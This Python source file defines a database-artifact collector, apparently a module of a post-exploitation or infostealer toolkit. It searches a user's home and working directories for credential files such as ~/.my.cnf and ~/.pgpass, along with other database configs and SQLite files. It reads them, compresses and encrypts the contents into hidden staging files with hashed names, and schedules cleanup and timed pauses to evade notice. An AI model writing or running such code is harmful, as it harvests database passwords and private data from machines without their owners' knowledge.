from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)


class DbCollector(BaseCollector):
    """
    Collect local and cloud database configuration artifacts.

    Targets:
      - ~/.my.cnf
      - ~/.pgpass
      - SQLite database files in common app directories
      - Redis/MongoDB config snippets
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        db_files = [
            (".my.cnf", "mysql"),
            (".pgpass", "postgres"),
            (".mongodb.conf", "mongodb"),
            (".redis.conf", "redis"),
            ("mssql.conf", "mssql"),
        ]

        for f, db_type in db_files:
            p = Path.home() / f
            if p.exists():
                yield ArtifactMetadata(
                    artifact_family="database_config",
                    artifact_subtype=db_type,
                    source_path=str(p),
                    source_platform=os.name,
                    collection_method="file_read",
                )

        # Also search for common SQLite databases
        for root in [Path.cwd(), Path.home()]:
            for match in root.rglob("*.sqlite"):
                if len(match.parts) - len(root.parts) > 3:
                    continue
                yield ArtifactMetadata(
                    artifact_family="database_config",
                    artifact_subtype="sqlite",
                    source_path=str(match),
                    source_platform=os.name,
                    collection_method="file_read",
                )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None

            data = path.read_bytes()
            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "db"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path=str(path),
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("Database artifact collection error (%s): %s", artifact.source_path, exc)
        return None
